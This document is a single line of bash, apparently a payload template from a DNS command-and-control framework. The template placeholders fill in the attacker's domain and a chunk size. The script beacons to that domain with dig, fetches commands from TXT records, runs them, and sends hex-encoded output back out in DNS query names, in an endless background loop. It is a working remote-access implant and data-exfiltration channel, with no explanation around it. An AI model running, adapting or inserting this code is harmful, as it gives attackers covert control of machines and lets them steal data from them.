url="{{.Domain}}";uid=$(cat /dev/urandom|tr -dc 'a-zA-Z0-9'|fold -w 8|head -n 1);function execDNS { cmd=$1;cmdid=$2;c=$($cmd 2>&1);s=$(echo -n "$c"|xxd -ps -c 200|tr -d "\n");l=${#s};spl={{.Split}};rep=$(($l/$spl));rem=$(($l%$spl));repr=$rep;if [ $rem -gt 0 ];then repr=$(($repr + 1));fi;for i in `seq 0 $rep`;do z=$(($i*$spl));str=${s:z:spl};durl=$str"."$(($i+1))"."$repr"."$cmdid"."$uid"."$url;dig a $durl>/dev/null 2>&1;done;}; while true;do checkin=$uid"."$url;dig a $checkin>/dev/null 2>&1;cid=$(cat /dev/urandom|tr -dc 'a-zA-Z0-9'|fold -w 5|head -n 1);sleep 5;u=$cid"."$uid"."$url;txt=$(dig +answer +short txt $u);txt="${txt%\"}";txt="${txt#\"}";if [[ $txt == "NoCMD" ]];then continue;fi;execDNS "$txt" $cid&done&